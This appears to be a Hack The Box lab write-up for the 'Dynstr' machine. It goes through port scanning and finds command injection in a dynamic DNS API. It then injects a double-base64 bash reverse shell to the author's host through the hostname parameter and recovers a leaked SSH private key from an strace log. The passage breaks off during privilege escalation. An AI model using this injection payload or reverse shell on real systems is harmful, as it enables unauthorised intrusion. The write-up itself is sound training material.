      <content:encoded><![CDATA[<p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Command injection</li>
<li>Dynamic DNS</li>
<li>Wildcard injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:06 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.078s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.14 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:07 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.54s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.16.1-Ubuntu
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Dyna DNS
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.76 seconds</span></span></code></pre>
</figure><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082250725.png" alt="image-20210617082250725"  /></div>
</p>
<p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0"target="_blank" rel="noopener noreferrer"
>dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p>
<p><div class="img-container"><img src="imgs/image-20210617082428463.png" alt="image-20210617082428463"  /></div>
</p>
<p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082655557.png" alt="image-20210617082655557"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> </span></span></code></pre>
</figure><p>These domain points to the same site.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.244/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class="p">;</span> <span class="k">do</span> curl -s http://<span class="nv">$i</span>/ <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span> 
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span></span></span></code></pre>
</figure><h3 id="dns-api">DNS API</h3>
<p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href="https://www.noip.com/integrate/request"target="_blank" rel="noopener noreferrer"
>no-ip.com</a>:</p>
<p><div class="img-container"><img src="imgs/image-20210617090837052.png" alt="image-20210617090837052"  /></div>
</p>
<p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p>
<p><div class="img-container"><img src="imgs/image-20210617091044264.png" alt="image-20210617091044264"  /></div>
</p>
<p>It returned with <code>good</code>.</p>
<p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">38459</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.no-ip.htb.                        IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.no-ip.htb.         <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">864</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:23:34 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">87</span></span></span></code></pre>
</figure><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="identify-command-injection">Identify Command Injection</h4>
<p>On Linux, there is a dynamic DNS utility called <a href="https://linux.die.net/man/8/nsupdate"target="_blank" rel="noopener noreferrer"
>&lt;code&gt;nsupdate&lt;/code&gt;</a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p>
<p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p>
<p><div class="img-container"><img src="imgs/image-20210617091628552.png" alt="image-20210617091628552"  /></div>
</p>
<p>If I search for that error on Google, I will see <a href="https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function"target="_blank" rel="noopener noreferrer"
>this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p>
<p><div class="img-container"><img src="imgs/image-20211018060424803.png" alt="image-20211018060424803"  /></div>
</p>
<p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit  <strong>`echo+iamf1`</strong>.<div class="img-container"><img src="imgs/image-20210617093614041.png" alt="image-20210617093614041"  /></div>
</p>
<p>It again responded with &ldquo;good&rdquo;.</p>
<p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">65360</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf1.no-ip.htb.               IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf1.no-ip.htb.        <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">735</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:36:20 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">88</span></span></span></code></pre>
</figure><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>&quot;</code> to enclose it, the server response leaks how it updates the DNS entry.</p>
<p><div class="img-container"><img src="imgs/image-20210617101554395.png" alt="image-20210617101554395"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span>base64 <span class="p">|</span>base64 -w0
</span></span><span class="line"><span class="cl"><span class="nv">WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class="o">==</span></span></span></code></pre>
</figure><p>The final query will looks like this.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53</span></span></code></pre>
</figure><p>On my listener</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.53<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244<span class="o">]</span> <span class="m">49648</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>659<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span></span></span></code></pre>
</figure><p>I will upgrade my shell.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ which python3
</span></span><span class="line"><span class="cl">which python3
</span></span><span class="line"><span class="cl">/usr/bin/python3
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ython3 -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ </span></span></code></pre>
</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-bindmgr">Shell as bindmgr</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">428</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">237141</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.script
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">29312</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.timing
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr   <span class="m">1175</span> Mar <span class="m">13</span> 14:53 command-output-C62796521.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">163048</span> Mar <span class="m">13</span> 14:52 strace-C62796521.txt</span></span></code></pre>
</figure><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="m">15123</span> openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> fstat<span class="o">(</span>5, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0600, <span class="nv">st_size</span><span class="o">=</span>1823, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> read<span class="o">(</span>5, <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class="o">)</span> <span class="o">=</span> <span class="m">1823</span></span></span></code></pre>
</figure><p>But when I try to use that key for SSH login, it asks for a password.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">bindmgr@10.10.10.244<span class="err">&#39;</span>s password:</span></span></code></pre>
</figure><p>My first guess is SSH has been configured to password only, but I find that <a href="https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option"target="_blank" rel="noopener noreferrer"
>UseDNS</a> is enabled here.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class="p">|</span> grep -v <span class="s1">&#39;^#&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span>
</span></span><span class="line"><span class="cl">Include /etc/ssh/sshd_config.d/*.conf
</span></span><span class="line"><span class="cl">PermitRootLogin yes
</span></span><span class="line"><span class="cl">ChallengeResponseAuthentication no
</span></span><span class="line"><span class="cl">UsePAM yes
</span></span><span class="line"><span class="cl">X11Forwarding yes
</span></span><span class="line"><span class="cl">PrintMotd no
</span></span><span class="line"><span class="cl">UseDNS yes
</span></span><span class="line"><span class="cl">AcceptEnv LANG LC_*
</span></span><span class="line"><span class="cl">Subsystem       sftp    /usr/lib/openssh/sftp-server</span></span></code></pre>
</figure><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ ls -l .ssh/
</span></span><span class="line"><span class="cl">ls -l
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">419</span> Mar <span class="m">13</span> 14:53 authorized_keys
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> bindmgr bindmgr <span class="m">1823</span> Mar <span class="m">13</span> 14:53 id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">395</span> Mar <span class="m">13</span> 14:53 id_rsa.pub
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">444</span> Mar <span class="m">13</span> 14:53 known_hosts
</span></span><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
</span></span><span class="line"><span class="cl"><span class="nv">from</span><span class="o">=</span><span class="s2">&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen</span></span></code></pre>
</figure><h4 id="update-dns">Update DNS</h4>
<p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind/$ cat named.conf.local
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">// Do any <span class="nb">local</span> configuration here
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Add infrastructure DNS updates.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/infra.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dyna.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dyna.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;10.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;10.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;168.192.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;168.192.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">// Enable DynDNS updates to customer zones.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/ddns.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dnsalias.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dnsalias.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
